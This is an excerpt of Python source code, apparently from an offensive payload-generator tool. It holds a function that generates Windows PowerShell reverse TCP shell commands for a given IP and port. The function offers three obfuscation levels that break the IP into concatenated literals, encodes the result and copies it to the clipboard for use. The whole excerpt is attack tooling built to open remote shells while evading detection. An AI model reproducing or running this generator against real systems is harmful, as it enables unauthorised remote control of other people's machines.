...
def generate_powershell_reverse_tcp(
    ip: str, port: int, obs: int, use_ssl: bool, no_child: bool = False
) -> str:
    """
    ...
    if obs == 1:
        payload = generate_windows_powershell_tcp_obfuscate_level1(
            raw, ip, port, use_ssl
        )
    ...
    if obs == 2:
        payload = generate_windows_powershell_tcp_obfuscate_level2(
            raw, ip, port, use_ssl
        )
        cmd = payutils.encode_win_payload(payload, no_child)
        payutils.copy_and_print(cmd)
    ...
    if obs == 3:
        payload = generate_windows_powershell_tcp_obfuscate_level3(
            raw, ip, port, use_ssl
        )
        cmd = payutils.encode_win_payload(payload, no_child)
        payutils.copy_and_print(cmd)
...
def generate_windows_powershell_tcp_obfuscate_level1(
    payload, ip, port, use_ssl: bool = False
):
    ip_parts = ip.split(".")
...
def generate_windows_powershell_tcp_obfuscate_level3(
    raw, ip, port, os_type, use_ssl: bool = False
):
    ip_parts = ip.split(".")
    ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)
    port_literal = str(port)
